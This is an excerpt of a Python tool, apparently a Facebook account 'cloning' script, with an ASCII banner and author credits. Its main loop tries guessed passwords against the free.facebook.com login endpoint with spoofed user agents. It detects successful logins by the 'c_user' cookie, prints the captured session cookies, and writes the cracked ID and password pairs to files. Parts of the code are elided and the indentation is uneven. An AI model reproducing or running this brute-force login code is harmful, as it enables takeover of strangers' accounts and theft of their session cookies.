...
╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝
                                    V.1
\033[1;30m───────────────────────────────────────────
\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m AUTHOR    : MD SOFIKUL ISLAM            
\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mFACEBOOK  : MD SOFIKUL ISLAM            
...
def Main():
        os.system("clear")
        os.system('xdg-open ')
        os.system('espeak -a 300 "WELCOME TO MD SOFIKUL ISLAM RANDOM TOOLS"')
        print(logo)
...
def fuck():
    ...
    os.system('clear')
    os.system('xdg-open ')
    os.system('espeak -a 300 "YOUR SIM CODE"')
    print(logo)
    ...
    print(' [+] OK Ids saved in sofik/OK.txt')
    print(' [+] CP Ids saved in sofik/CP.txt')
    print('•────────────────•°•❀•°•────────────────•')
    ...
    try:
        for ps in pwx:
           ...
           'user-agent': pro}
            ...
            lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_fr om_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[1;92m-OK🔥🖤🍎] {uid}|{ps} \nCookie[🍒] : {coki}")
                open('/sdcard/sofik/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[sofik-CP☠️] {uid}|{ps}")
                open('/sdcard/sofik-OK.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
